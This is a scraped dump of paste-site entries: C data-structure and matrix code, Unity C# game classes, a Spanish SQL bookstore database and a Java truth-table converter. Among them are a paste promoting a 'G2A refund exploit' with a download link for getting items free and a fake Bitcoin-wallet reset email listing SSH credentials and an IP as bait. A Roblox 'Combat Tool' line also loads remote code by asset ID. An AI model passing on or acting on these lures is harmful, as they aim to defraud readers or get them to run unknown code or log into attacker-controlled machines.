        printf(""Dynamic Deque is empty.\n"");
        return -1;
    }
    int removed = deque->front->data;
    Node* temp = deque->front;
    if (deque->front == deque->rear) {
        deque->front = deque->rear = NULL;
    } else {
        deque->front = deque->front->next;
        deque->front->prev = NULL;
    }
    free(temp);
    deque->size--;
    return removed;
}

int removeRearDynamic(DynamicDeque *deque) {
    if (isDynamicDequeEmpty(deque)) {
        printf(""Dynamic Deque is empty.\n"");
        return -1;
    }
    int removed = deque->rear->data;
    Node* temp = deque->rear;
    if (deque->front == deque->rear) {
        deque->front = deque->rear = NULL;
    } else {
        deque->rear = deque->rear->prev;
        deque->rear->next = NULL;
    }
    free(temp);
    deque->size--;
    return removed;
}

int getFrontDynamic(DynamicDeque *deque) {
    if (isDynamicDequeEmpty(deque)) {
        printf(""Dynamic Deque is empty.\n"");
        return -1;
    }
    return deque->front->data;
}

int getRearDynamic(DynamicDeque *deque) {
    if (isDynamicDequeEmpty(deque)) {
        printf(""Dynamic Deque is empty.\n"");
        return -1;
    }
    return deque->rear->data;
}

void freeDynamicDeque(DynamicDeque *deque) {
    while (!isDynamicDequeEmpty(deque)) {
        removeFrontDynamic(deque);
    }
}

int main() {
    // Static Deque
    StaticDeque staticDeque;
    initStaticDeque(&staticDeque);

    addFrontStatic(&staticDeque, 5);
    addRearStatic(&staticDeque, 10);

    printf(""Static Deque Front element: %d\n"", getFrontStatic(&staticDeque));
    printf(""Static Deque Rear element: %d\n"", getRearStatic(&staticDeque));

    removeFrontStatic(&staticDeque);
    removeRearStatic(&staticDeque);

    // Dynamic Deque
    DynamicDeque dynamicDeque;
    initDynamicDeque(&dynamicDeque);

    addFrontDynamic(&dynamicDeque, 15);
    addFrontDynamic(&dynamicDeque, 16);
    addFrontDynamic(&dynamicDeque, 17);
    addRearDynamic(&dynamicDeque, 20);

    printf(""Dynamic Deque Front element: %d\n"", getFrontDynamic(&dynamicDeque));
    printf(""Dynamic Deque Rear element: %d\n"", getRearDynamic(&dynamicDeque));
    removeFrontDynamic(&dynamicDeque);
    removeRearDynamic(&dynamicDeque);

    return 0;
}
"
y4a6m567,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Sunday 17th of December 2023 05:09:59 PM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

371789"
me0BnuAr,vij me kuv sum qk tr tr tarikat,vallec,C,Sunday 17th of December 2023 04:21:51 PM CDT,"#include <stdio.h>

int main() {
    int n;
    printf(""Enter the size of the matrix: "");
    scanf(""%d"", &n);
    int matrix[n][n];
 
    printf(""Enter the elements of the matrix:\n "");
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < n; j++) {
            printf(""matrix[%d][%d]: "", i, j);
            scanf(""%d"", &matrix[i][j]);
        }
    }
 
    printf(""The matrix:\n"");
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < n; j++) {
            printf(""%d\t"", matrix[i][j]);
        }
        printf(""\n"");
    }

    int zeroElements = 0;

    for (int i = 1; i < n; i++) {
        int diagonalSize = n - i;
        if (diagonalSize > 1) {
            for (int j = 0; j < diagonalSize; j++) {
                if(matrix[j][i + j] == 0) {
                    zeroElements = zeroElements + 1;
                }
            }
        }
    }

    for (int i = 1; i < n; i++) {
        int diagonalSize = n - i;
        if (diagonalSize > 1) {
            for (int j = 0; j < diagonalSize; j++) {
                if(matrix[i + j][j] == 0) {
                    zeroElements = zeroElements + 1;
                }
            }
        }
    }
    
    printf(""Elements with zero: %d"", zeroElements);

    return 0;
}
"
D0LDQE3t,Skill Class,OfficialNerdFire,C#,Sunday 17th of December 2023 04:04:10 PM CDT,"/*
Author: Cedric Johnson (SlothyCeddy) 
Description: A uniform and scaleable way to implement the various skills in the game. Allows for easily creating new skills as needed, especially
when a character unlocks a new skill through progression. 

This class is used to dynamically manage all aspects of Skills and Skill checks. Even if new Modifiers are added, no changes need to be made
to this class to accomedate the addition.
 */
using System.Collections.Generic;
using UnityEngine;
using GameUtilities.Modifiers;
using GameUtilities.Dice;
using GameUtilities.ModifierMethods;

namespace CharacterInfo
{
    [System.Serializable]
    public class Skill
    {
        #region fields
        [SerializeField]
        private int skillRanks = 0; //Default value for all characters
        [SerializeField]
        private AbilityScore abilityScore;
        [SerializeField]
        private List<ModifierType> modifiers = new();

        private int skillModifier;

        #endregion

        public Skill(AbilityScore defualtScore)
        {
            if (defualtScore != null)
                abilityScore = defualtScore;
            else
                abilityScore = new AbilityScore(10);//Characters without an ability score add a Modifier of 0
        }

        public List<ModifierType> GetSkillModifiers()
        {
            return modifiers;
        }

        //Changes the skill's default ability score
        public void SetAbilityModifier(AbilityScore val)
        {
            abilityScore = val;
            UpdateSkillModifier();
        }

        //Adds a new modifier to the defualt skill
        public void AddSkillModifier(ModifierType newModifier)
        {
            modifiers.Add(newModifier);
            UpdateSkillModifier();
        }

        //Removes a specific modifier from the list of modifiers
        public void RemoveSkillModifier(ModifierType toRemove)
        {
            if (modifiers.Contains(toRemove))
            {
                modifiers.Remove(toRemove);
                UpdateSkillModifier();
            }
        }

        //Updates the default skillModifier. Only called when the default Ability Modifier is changed OR when a new modifier is added or removed
        public void UpdateSkillModifier()
        {
            skillModifier = abilityScore.GetAbilityModifier() + skillRanks + ModifierHelper.AddModifiers(modifiers);
        }

        //Gets the current skillModifier
        public int GetSkillModifier()
        {
            return skillModifier;
        }

        //Overload of GetSkillModifier, used when a different ability score than the default should be used
        public int GetSkillModifier(AbilityScore overrideDefault)
        {
            return overrideDefault.GetAbilityModifier() + skillRanks + ModifierHelper.AddModifiers(modifiers);
        }

        //Basic SkillCheck using default values
        public int SkillCheck()
        {
            return DiceRoller.Roll(DiceRoller.Dice.D20) + GetSkillModifier();
        }

        //Overload of SkillCheck that accepts situational modifiers
        public int SkillCheck(List<ModifierType> passedModifiers)
        {
            return DiceRoller.RollWithModifier(DiceRoller.Dice.D20, ModifierHelper.AddModifiers(passedModifiers)) + GetSkillModifier();
        }

        //Overload of SkillCheck that accepts a new AbilityScore
        public int SkillCheck(AbilityScore overrideDefault)
        {
            return DiceRoller.Roll(DiceRoller.Dice.D20) + GetSkillModifier(overrideDefault);
        }

        //Overload of SkillCheck that accepts a new AbilityScore AND situational modifiers
        public int SkillCheck(AbilityScore overrideDefault, List<ModifierType> passedModifiers)
        {
            return DiceRoller.RollWithModifier(DiceRoller.Dice.D20, ModifierHelper.AddModifiers(passedModifiers)) + GetSkillModifier(overrideDefault);
        }

        //Determines if a Skill Check is successful given a target
        public bool TargetSkillCheck(int target)
        {
            return SkillCheck() >= target;
        }

        //Overload of TargetSkillCheck that accepts a new AbilityScore
        public bool TargetSkillCheck(int target, AbilityScore overrideDefault)
        {
            return SkillCheck(overrideDefault) >= target;
        }

        //Overload of TargetSkillCheck that accepts situational modifiers
        public bool TargetSkillCheck(int target, List<ModifierType> passedModifiers)
        {
            return SkillCheck(passedModifiers) >= target;
        }

        //Overload of TargetSkillCheck that accepts a new AbilityScore AND situational modifiers
        public bool TargetSkillCheck(int target, AbilityScore overrideDefault, List<ModifierType> passedModifiers)
        {
            return SkillCheck(overrideDefault, passedModifiers) >= target;
        }
    }

    public enum Skills
    {
        Balance,
        Bluff,
        ChakraControl,
        Climb,
        CombatArts,
        ComputerUse,
        Concentration,
        CraftCalligraphy,
        CraftChemical,
        CraftMechanical,
        CraftPharmaceutical,
        CraftStructural,
        CraftVisualArts,
        CraftWriting,
        DeciperScript,
        Demolitions,
        Diplomacy,
        DisableDevice,
        Disguise,
        Drive,
        EscapeArtist,
        Forgery,
        Gamble,
        GatherInformation,
        HandleAnimal,
        Hide,
        IllusionArts,
        Intimidate,
        Investigate,
        Jump,
        KnowledgeArcaneLore,
        KnowledgeArt,
        KnowledgeCivics,
        KnowledgeCurrentEvents,
        KnowledgeNinjaLore,
        KnowledgePhysicalSciences,
        KnowledgePopularCulture,
        KnowledgeStreetwise,
        KnowledgeTactics,
        KnowledgeTechnology,
        KnowledgeTheologyAndPhilosophy,
        Listen,
        MoveSilently,
        Navigate,
        NinjaArts,
        PerformAct,
        PerformDance,
        PerformKeyboards,
        PerformMartialArts,
        PerformPercussionInstruments,
        PerformSing,
        PerformStandUp,
        PerformStringedInstruments,
        PerformWindInstruments,
        Pilot,
        Profession,
        ReadAndWriteLanguage,
        Repiar,
        Reaserch,
        Ride,
        SealingArts,
        Search,
        SenseMotive,
        SignLanguage,
        SleightOfHand,
        SpeakLanguage,
        Spot,
        Survival,
        Swim,
        TreatInjury,
        Tumble
    }
}"
zjBwmGwW,AbilityScore class,OfficialNerdFire,C#,Sunday 17th of December 2023 04:03:38 PM CDT,"/*
Author: Cedric Johnson (SlothyCeddy)
Description: A Generic Class meant to define how the six ability scores opperate. Every character sheet will have six 
AbilityScore objects instantiated. 

Note that abilityModifer is read-only save for within this class as there should never be an instance where it is 
directly changed (Only changed when the Ability Score does).

Note that when a creature lacks an AbilityScore, it is treated as a score of 10 (modifier 0) for all purposes
 */
using UnityEngine;
using GameUtilities.Modifiers;
using GameUtilities.ModifierMethods;
using GameUtilities.Dice;
using System.Collections.Generic;

namespace CharacterInfo
{
    [System.Serializable]
    public class AbilityScore
    {
        [SerializeField]
        private int abilityScoreValue, abilityModifier;

        private List<ModifierType> modifiers = new List<ModifierType>();

        //Constructor
        public AbilityScore(int abilityScoreValue)
        {
            this.abilityScoreValue = abilityScoreValue;
            UpdateAbilityModifier();
        }

        //Read-Only outside of AbilityScore Class
        public int GetAbilityModifier()
        {
            return abilityModifier;
        }

        //Get and Set AbilityScoreValue. Setting the value also updates the abilityScore
        public int GetAbilityScoreValue()
        {
            return abilityScoreValue;
        }

        public void SetAbilityScoreValue (int value)
        {
            abilityScoreValue = value;
            UpdateAbilityModifier();
        }

        //Get, Add, and Remove Modifiers
        public List<ModifierType> GetAbilityModifiers()
        {
            return modifiers;
        }

        public void AddAbilityModifier(ModifierType newModifier)
        {
            modifiers.Add(newModifier);
            UpdateAbilityModifier();
        }

        public void RemoveAbilityModifier(ModifierType toRemove)
        {
            if (modifiers.Contains(toRemove))
            {
                modifiers.Remove(toRemove);
                UpdateAbilityModifier();
            }
        }

        //Should only be called from within this class when the abilityScoreValue is updated.
        private void UpdateAbilityModifier ()
        {
            abilityModifier = ((abilityScoreValue + ModifierHelper.AddModifiers(modifiers)) / 2) - 5;
        }

        //Basic AbilityCheck
        public int AbilityCheck()
        {
            return DiceRoller.RollWithModifier(DiceRoller.Dice.D20, abilityModifier);
        }

        //Determines if an AbilityCheck is succesful given a target
        public bool TargetAbilityCheck(int target)
        {
            return AbilityCheck() >= target;
        }
    }
}"
cpzgiYsv,Base de datos,Hatkat,SQL,Sunday 17th of December 2023 04:00:43 PM CDT,"-- CREACIÓN Y USO DE LA BASE DE DATOS

create database libreria;
use libreria;

-- CREACIÓN DE LAS TABLAS 

CREATE TABLE autor (
    id_autor SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_autor VARCHAR(50) NOT NULL,
    apellido_autor VARCHAR(50) NOT NULL,
    fecha_nacimiento DATE,
    PRIMARY KEY (id_autor)
);
CREATE TABLE tipoLibro (
    id_tipoLibro SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_tipoLibro VARCHAR(50) NOT NULL,
    descripcion_tipoLibro TEXT NOT NULL,
    PRIMARY KEY (id_tipoLibro)
);
CREATE TABLE edicion (
    id_edicion SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_edicion VARCHAR(50) NOT NULL,
    PRIMARY KEY (id_edicion)
);
CREATE TABLE editorial (
    id_editorial SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_editorial VARCHAR(50) NOT NULL,
    direccion_editorial VARCHAR(50) NOT NULL,
    telefono_editorial VARCHAR(10) NOT NULL,
    PRIMARY KEY (id_editorial)
);
CREATE TABLE pais (
    id_pais SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_pais VARCHAR(50) NOT NULL,
    codigo_pais CHAR(2) NOT NULL,
    PRIMARY KEY (id_pais)
);
CREATE TABLE lugarImpresion (
    id_lugarImpresion SMALLINT NOT NULL AUTO_INCREMENT,
    nombre_lugar VARCHAR(50) NOT NULL,
    direccion_lugar VARCHAR(50) NOT NULL,
    PRIMARY KEY (id_lugarImpresion)
);
CREATE TABLE libro (
    id_libro SMALLINT NOT NULL AUTO_INCREMENT,
    titulo VARCHAR(100) NOT NULL,
    isbn VARCHAR(20) NOT NULL,
    valor DECIMAL(10, 2) NOT NULL,
    num_paginas SMALLINT NOT NULL,
    fecha_publicacion DATE NOT NULL,
    id_autor SMALLINT NOT NULL,
    id_tipoLibro SMALLINT NOT NULL,
    id_edicion SMALLINT NOT NULL,
    id_editorial SMALLINT NOT NULL,
    id_pais SMALLINT NOT NULL,
    id_lugarImpresion SMALLINT NOT NULL,
    PRIMARY KEY (id_libro),
    FOREIGN KEY (id_autor) REFERENCES autor(id_autor) ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY (id_tipoLibro) REFERENCES tipoLibro(id_tipoLibro) ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY (id_edicion) REFERENCES edicion(id_edicion) ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY (id_editorial) REFERENCES editorial(id_editorial) ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY (id_pais) REFERENCES pais(id_pais) ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY (id_lugarImpresion) REFERENCES lugarImpresion(id_lugarImpresion) ON DELETE RESTRICT ON UPDATE CASCADE
);


-- 10 DATOS PARA CADA UNA DE LAS TABLAS

INSERT INTO autor (id_autor, nombre_autor, apellido_autor, fecha_nacimiento) VALUES
    (DEFAULT, 'Gabriel', 'García Márquez', '1927-03-06'),
    (DEFAULT, 'Jorge', 'Luis Borges', '1899-08-24'),
    (DEFAULT, 'Mario', 'Vargas Llosa', '1936-03-28'),
    (DEFAULT, 'Jorge', 'Adoum', '1904-07-12'),
    (DEFAULT, 'Joaquín', 'Gallegos', '1914-03-31'),
    (DEFAULT, 'Alfredo', 'Diezcanseco', '1914-08-26'),
    (DEFAULT, 'José', 'Saramago', '1922-11-16'),
    (DEFAULT, 'Jorge', 'Icaza', '1950-01-01'),
    (DEFAULT, 'Isabel', 'Allende', '1942-08-02'),
    (DEFAULT, 'José', 'Martínez Queirolo', '1920-12-12'),
    (DEFAULT, 'Juan', 'Montalvo', '1832-04-13'),
    (DEFAULT, 'Alfredo', 'Pareja Diezcanseco', '1908-10-12');
    
INSERT INTO tipoLibro (id_tipoLibro, nombre_tipoLibro, descripcion_tipoLibro) VALUES
    (DEFAULT, 'Ficción', 'Libros que presentan historias imaginarias o creadas'),
    (DEFAULT, 'No ficción', 'Libros que presentan hechos reales o información'),
    (DEFAULT, 'Ciencia ficción', 'Libros que presentan escenarios futuristas o de ciencia especulativa'),
    (DEFAULT, 'Misterio', 'Libros que presentan eventos inexplicables o enigmáticos'),
    (DEFAULT, 'drama', 'Libros que presentan historias de amor y relaciones'),
    (DEFAULT, 'Biografía', 'Libros que cuentan la historia de la vida de una persona'),
    (DEFAULT, 'Fantasía', 'Libros que presentan mundos o situaciones imaginarias'),
    (DEFAULT, 'Autoayuda', 'Libros que ofrecen consejos y técnicas para el desarrollo personal'),
    (DEFAULT, 'Historia', 'Libros que narran eventos pasados y sucesos significativos'),
    (DEFAULT, 'Arte', 'Libros que exploran la expresión artística y creativa');

INSERT INTO edicion (id_edicion, nombre_edicion) VALUES
	(DEFAULT, 'Primera Edición'),
	(DEFAULT, 'Edición Especial'),
	(DEFAULT, 'Edición Limitada'),
	(DEFAULT, 'Edición de Coleccionista'),
	(DEFAULT, 'Edición Revisada'),
	(DEFAULT, 'Edición Anotada'),
	(DEFAULT, 'Edición de Bolsillo'),
	(DEFAULT, 'Edición de Lujo'),
	(DEFAULT, 'Edición Ilustrada'),
	(DEFAULT, 'Edición Crítica');

INSERT INTO editorial (id_editorial, nombre_editorial, direccion_editorial, telefono_editorial) VALUES
    (DEFAULT, 'Editorial Central', 'Av. Malecón Simón Bolívar', '0932456789'),
    (DEFAULT, 'Editorial Beta', 'Cdla. Kennedy Vieja, Mz. 4', '0928765432'),
    (DEFAULT, 'Ediciones Universales', 'Av. Francisco de Orellana', '0945612378'),
    (DEFAULT, 'Ediciones Modernas', 'Av. Carlos Julio Arosemena', '0965432187'),
    (DEFAULT, 'Editorial Infinity', 'Urdesa Central, Av. Las Lomas', '0971234567'),
    (DEFAULT, 'Publicaciones Estelares', 'Cdla. Vernaza Norte, Calle 10', '0919876543'),
    (DEFAULT, 'Ediciones del Sur', 'Av. Francisco de Quevedo', '0992345678'),
    (DEFAULT, 'Editorial Global', 'Av. Juan Tanca Marengo', '0987654321'),
    (DEFAULT, 'Libros Contemporáneos', 'Sauces 6, Mz. 8, V. 7', '0912345678'),
    (DEFAULT, 'Ediciones Avanzadas', 'Alborada Etapa XI, Mz. 100', '0998765432');

INSERT INTO pais (id_pais, nombre_pais, codigo_pais) VALUES
    (DEFAULT, 'Ecuador', 'EC'),
    (DEFAULT, 'Estados Unidos', 'US'),
    (DEFAULT, 'España', 'ES'),
    (DEFAULT, 'Colombia', 'CO'),
    (DEFAULT, 'Argentina', 'AR'),
    (DEFAULT, 'México', 'MX'),
    (DEFAULT, 'Perú', 'PE'),
    (DEFAULT, 'Chile', 'CL'),
    (DEFAULT, 'Brasil', 'BR'),
    (DEFAULT, 'Uruguay', 'UY');

INSERT INTO lugarImpresion VALUES
    (DEFAULT, 'Imprenta Guayaquil', 'Av. Quito y Boyacá'),
    (DEFAULT, 'Gráfica Atarazana', 'Cdla. La Atarazana, Mz. 1, V. 6'),
    (DEFAULT, 'Copias Rápidas Guayaquil', 'Av. 9 de Octubre y Pichincha'),
    (DEFAULT, 'ImprimeYa', 'Av. Francisco de Orellana, Plaza Lagos'),
    (DEFAULT, 'Imprenta Veloz', 'Cdla. Kennedy, Calle 8va y 5ta'),
    (DEFAULT, 'Copistería Express', 'Urdesa Central, Av. Las Lomas'),
    (DEFAULT, 'DigitalPrint Guayaquil', 'Sauces 1, Calle Principal'),
    (DEFAULT, 'Impresiones Modernas', 'Av. Del Periodista y Fco. de Icaza'),
    (DEFAULT, 'Gráfica Creativa', 'Cdla. Alborada, Mz. 5, V. 10'),
    (DEFAULT, 'Impresiones Profesionales', 'Ciudadela Simón Bolívar, Mz. 11, V. 20');

-- 40 DATOS PARA LA TABLA PRINCIPAL LIBROS

INSERT INTO libro (id_libro, titulo, isbn, valor, num_paginas, fecha_publicacion, id_autor, id_tipoLibro, id_edicion, id_editorial, id_pais, id_lugarImpresion)
VALUES
    (default, 'El tiempo entre costuras', '9788408053645', 5.50, 390, '2010-04-01', 6, 4, 10, 1, 8, 7),
	(default, 'La Sombra del Viento', '9788401337800', 6.25, 500, '2001-07-01', 3, 9, 2, 5, 6, 4),
	(default, 'Cien años de soledad', '9780307474728', 6.75, 120, '1967-05-30', 9, 5, 1, 8, 7, 3),
	(default, 'Rayuela', '9788437602100', 7.00, 300, '1963-07-28', 2, 6, 10, 7, 4, 1),
	(default, 'Los pilares de la Tierra', '9780451225245', 5.75, 800, '1989-10-06', 1, 8, 6, 9, 2, 10),
	(default, 'Don Quijote de la Mancha', '9788424118946', 6.80, 1000, '1605-01-16', 5, 3, 7, 4, 10, 9),
	(default, 'El Aleph', '9788466321921', 5.90, 150, '1949-06-01', 10, 7, 4, 2, 9, 8),
	(default, 'La ciudad y los perros', '9788423339631', 6.20, 400, '1963-11-01', 8, 1, 5, 10, 3, 6),
	(default, 'Crimen y castigo', '9780099981909', 6.30, 550, '1866-11-11', 7, 2, 8, 3, 5, 1),
	(default, 'El amor en los tiempos del cólera', '9780307350429', 5.40, 350, '1985-10-30', 4, 10, 3, 6, 1, 5),
	(default, 'Cumbres Borrascosas', '9788491051500', 6.85, 320, '1847-12-19', 1, 5, 9, 7, 8, 4),
	(default, 'La metamorfosis', '9788491051500', 5.60, 200, '1915-12-01', 2, 9, 6, 4, 7, 3),
	(default, '1984', '9788499890944', 6.70, 350, '1949-06-08', 3, 6, 1, 8, 5, 9),
	(default, 'El principito', '9788408168174', 5.20, 100, '1943-04-06', 4, 1, 7, 5, 9, 10), 
	(default, 'It', '9781501142970', 6.90, 1138, '1986-09-15', 5, 1, 8, 4, 7, 2),
	(default, 'El código Da Vinci', '9780307474278', 7.00, 489, '2003-03-18', 6, 10, 4, 9, 2, 8),
	(default, 'Harry Potter y la piedra filosofal', '9788498386963', 6.30, 256, '1997-06-26', 7, 3, 9, 1, 6, 5),
	(default, 'El Señor de los Anillos: La comunidad del anillo', '9788445071057', 6.80, 496, '1954-07-29', 7, 5, 9, 8, 2, 10),
	(default, 'Las crónicas de Narnia: El león, la bruja y el armario', '9780064471046', 5.90, 208, '1950-10-16', 9, 1, 3, 10, 7, 6),
	(default, 'Orgullo y prejuicio', '9788491050930', 6.60, 432, '1813-01-28', 8, 2, 6, 4, 1, 5),
	(default, 'El Hobbit', '9788445071415', 6.95, 129, '1937-09-21', 5, 1, 7, 1, 4, 2),
	(default, 'El retrato de Dorian Gray', '9788491050060', 5.80, 320, '1890-06-20', 2, 7, 8, 5, 10, 6),
	(default, 'Frankenstein', '9788491052149', 6.45, 280, '1818-01-01', 4, 6, 5, 9, 3, 1),
	(default, 'Matar a un ruiseñor', '9788491051685', 6.25, 464, '1960-07-11', 3, 10, 1, 7, 5, 9),
	(default, 'El cuaderno de Maya', '9788408120394', 6.75, 512, '2011-06-01', 6, 9, 4, 3, 8, 1),
	(default, 'El silencio de la ciudad blanca', '9788408195477', 5.95, 544, '2016-03-01', 1, 3, 10, 6, 9, 8),
	(default, 'La reina roja', '9788466664417', 6.10, 480, '2018-11-06', 10, 4, 2, 9, 6, 7),
	(default, 'De animales a dioses', '9788499924644', 6.80, 528, '2014-04-30', 9, 2, 3, 4, 7, 10),
	(default, 'La chica del tren', '9788498389667', 6.40, 130, '2015-01-13', 7, 1, 9, 1, 4, 3),
	(default, 'El perfume', '9788420471180', 6.85, 275, '1985-01-01', 1, 5, 4, 7, 9, 2),
	(default, 'El alquimista', '9780062511409', 6.25, 197, '1988-04-01', 3, 8, 1, 6, 5, 4),
	(default, 'La catedral del mar', '9788496333159', 5.75, 704, '2006-06-01', 4, 1, 7, 10, 8, 9),
	(default, 'La ladrona de libros', '9780307475732', 6.40, 125, '2005-03-01', 6, 1, 5, 2, 1, 10),
	(default, 'El jardín olvidado', '9788490322223', 6.70, 528, '2008-04-01', 2, 10, 6, 8, 3, 7),
	(default, 'La isla bajo el mar', '9788408088029', 5.90, 512, '2009-01-01', 8, 1, 9, 7, 10, 4),
	(default, 'El médico', '9788496940008', 6.30, 1072, '1986-10-01', 10, 9, 3, 5, 2, 8),
	(default, 'La historia interminable', '9788420484732', 6.20, 448, '2022-09-01', 5, 7, 10, 2, 1, 3),
	(default, 'Los juegos del hambre', '9788427202139', 6.80, 400, '2008-09-01', 4, 3, 8, 1, 6, 7),
	(default, 'La hoguera de las vanidades', '9788497939000', 7.00, 832, '1987-11-01', 3, 5, 4, 2, 9, 10),
	(default, 'Los hombres que no amaban a las mujeres', '9788483652890', 6.90, 672, '2005-01-01', 6, 1, 2, 8, 3, 4),
	(default, 'La sombra del viento', '9788408053645', 6.25, 120, '2018-07-01', 9, 1, 6, 10, 8, 5);
    
-- 3 CONSULTAS EN LA BASE DE DATOS

-- PRIMERA CONSULTA

SELECT libro.titulo, edicion.nombre_edicion, editorial.nombre_editorial
FROM libro
INNER JOIN edicion ON edicion.id_edicion = libro.id_edicion
INNER JOIN editorial ON editorial.id_editorial = libro.id_editorial
WHERE fecha_publicacion BETWEEN '2010-01-01' AND '2023-12-20';

-- SEGUNDA CONSULTA

select libro.titulo, autor.nombre_autor, autor.apellido_autor
from libro
inner join autor on autor.id_autor = libro.id_autor
inner join pais on pais.id_pais = libro.id_pais
and pais.codigo_pais = 'EC';

-- TERCERA CONSULTA

select libro.titulo, tipoLibro.nombre_tipoLibro, libro.num_paginas
from libro
inner join tipoLibro on tipoLibro.id_tipoLibro = libro.id_tipoLibro
and tipoLibro.nombre_tipoLibro = 'ficcion' or tipoLibro.nombre_tipoLibro = 'drama'
where libro.num_paginas > 100 and libro.num_paginas < 130;
"
QJPceSrJ,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 17th of December 2023 03:57:42 PM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-695730"
Gvgm0P94,Combat Tool,robinmollen,Lua,Sunday 17th of December 2023 03:32:23 PM CDT,"require(15627085040).RAroblox(""YourNameHere"")"
R3QwdaNu,Untitled,ateyevtm,C++,Sunday 17th of December 2023 03:26:38 PM CDT,"#include <iostream>
using namespace std;
int main() {
    int n,count = 0;
    cin >> n;
    int arr[n];
    for (int i = 0; i < n; ++i){
        cin >> arr[i];
    }
    for (int i = 0; i < n - 1; ++i) {
        if(arr[i] % 10 + arr[i+1] % 10 < 10){
            ++count;
        }
    }
    cout << count << "" "";

    return 0;
}
"
1PzTUED5,CCSB Battle Monsters,sffc1,JavaScript,Sunday 17th of December 2023 03:19:15 PM CDT,"{
	// ASSETS:
	// Add custom assets (usually images) here to make them available to the template.
	// Follow these steps:
	//  1) Add the image in the ""Assets"" tab. Note the file name.
	//  2) List the asset here, using the following syntax:
	//
	//   ""asset_name (img,path)"": ""assets/filename.jpg""
	//
	assets: {
		""background (img,path)"": ""assets/_gabriola.png""
	}

	// GUIDE:
	// Fill in the following multi-line string with Markdown.  A ""Guide"" tab will show up on the left.  It will be the default tab instead of the ""Template"" tab when you open the file.  This is useful if you are designing a custom template (ccst file) to share with others.
	guide: '''
	'''

	// COORDINATE SYSTEMS:
	// Information for the internal coordinate systems within the card layout and page layout.  The ""width"" and ""height"" values will specify the width and height of the SVG view box.  For more information on the SVG view box, see https://www.google.com/search?q=svg+viewbox
	viewports: {
		// card: {
		// 	width: 180
		// 	height: 252
		// 	xOffset: 0
		// 	yOffset: 0
		// }
		card: {
			width: 198
			height: 270
			xOffset: -9
			yOffset: -9
		}
		page: {
			width: 612
			height: 792
			cardWidth: 180
			cardHeight: 252

			// Minimum print margin.  Defaults to zero.  Increase this to prevent cards from being placed too close to the edge of the page.
			printMargin: 0
		}
	}

	// PAGE LAYOUT:
	// Information to be used when exporting the cards.
	// Note: 'pt' means 'points', a unit customary for print layout in the United States.  Supported units are: em, ex, px, pt, pc, cm, mm, and in.
	dimensions: {
		// card: {
		// 	// 2.5 in by 3.5 in
		// 	unit: ""pt""
		// 	width: 180
		// 	height: 252
		// 	dpi: 300
		// }
		card: {
			// 2.75 in by 3.75 in
			unit: ""pt""
			width: 825
			height: 1125
			dpi: 72
		}
		page: {
			// 8.5 in by 11 in
			unit: ""pt""
			width: 612
			height: 792
			dpi: 300
		}
	}
	// Card Creatr supports two page layout strategies: ""tight"" and ""evenSpacing"". Choose ""tight"" to squeeze all cards into the middle of the page, with no margin between cards. Choose ""evenSpacing"" to add space between cards.
	layoutStrategy: ""tight""

	// GRID:
	// Used by Card Creatr Studio to control the grid overlay.
	grid: {
		color: ""#00FFFF""
		weight: 1
		opacity: 0.5
		size: 12
	}

	// FONT RENDER MODE:
	// Whether text should be converted to SVG paths before output.  Converting text to SVG paths sometimes eliminates strange behaviors in the operating system's font rendering engine.  Note that emoji and some Indic scripts are *not* supported in SVG path mode.  This only affects text boxes created using the +text or +textWrap mixins.
	// Options are ""auto"" (default) or ""paths"" (convert text to SVG paths)
	fontRenderMode: ""auto""
}
"
gyxShr7L,ConvertToDNF,NeverRIEght,Java,Sunday 17th of December 2023 03:12:57 PM CDT,"import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);

        printTableOfTruth(convertFromCNFToTable(sc));
        //System.out.println(convertFromTableToDNF(sc));


        sc.close();
    }

    public static int[][] convertFromCNFToTable(Scanner sc) {
        String input = sc.nextLine();
        input = input.replaceAll("" "","""");

        System.out.println(input);

        String[] arrayOfAdds = new String[32];

        if(input.contains("")("")) {
            arrayOfAdds = input.split(""\\)\\("");
            System.out.println(arrayOfAdds.length);
//            for(int i = 0; i < arrayOfAdds.length; i++) {
//                arrayOfAdds[i] = arrayOfAdds[i].replaceAll(""\\("","""");
//                arrayOfAdds[i] = arrayOfAdds[i].replaceAll(""\\)"","""");
//            }
        }




        int[][] tableOfTruth = new int[32][6];

        for(int i = 0; i < arrayOfAdds.length; i++) {
            if(arrayOfAdds[i].contains(""~a"")) {
                tableOfTruth[i][0] = 1;
            } else {
                tableOfTruth[i][0] = 0;
            }

            if(arrayOfAdds[i].contains(""~b"")) {
                tableOfTruth[i][1] = 1;
            } else {
                tableOfTruth[i][1] = 0;
            }

            if(arrayOfAdds[i].contains(""~c"")) {
                tableOfTruth[i][2] = 1;
            } else {
                tableOfTruth[i][2] = 0;
            }

            if(arrayOfAdds[i].contains(""~d"")) {
                tableOfTruth[i][3] = 1;
            } else {
                tableOfTruth[i][3] = 0;
            }

            if(arrayOfAdds[i].contains(""~e"")) {
                tableOfTruth[i][4] = 1;
            } else {
                tableOfTruth[i][4] = 0;
            }
        }

        return tableOfTruth;
    }
    public static void printTableOfTruth(int[][] tableOfTruth) {
        System.out.println(""a\tb\tc\td\te\tf"");
        for(int i = 0; i < tableOfTruth.length; i++) {
            for(int j = 0; j < tableOfTruth[i].length; j++) {
                System.out.print(tableOfTruth[i][j] + ""\t"");
            }
            System.out.println();
        }
    }
